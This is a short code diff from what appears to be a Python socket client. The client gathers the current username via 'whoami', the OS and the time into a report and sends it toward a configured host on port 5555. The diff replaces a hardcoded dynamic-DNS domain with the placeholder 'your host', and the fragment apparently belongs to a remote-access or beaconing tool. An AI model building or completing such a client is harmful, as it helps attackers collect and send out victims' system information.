@@ -10,7 +10,7 @@ class Sock_Client():
         self.whois = os.popen("whoami").read()
         self.platform = platform.system()
         self.time = time.ctime()
-        self.host = "colegiosanmarcos.zapto.org" #Input your host
+        self.host = "your host" #Input your host
         self.port = 5555
         self.structure = (f"---Computer--- : {self.whois}"
                           f"---Date Time--- : {self.time}\n"
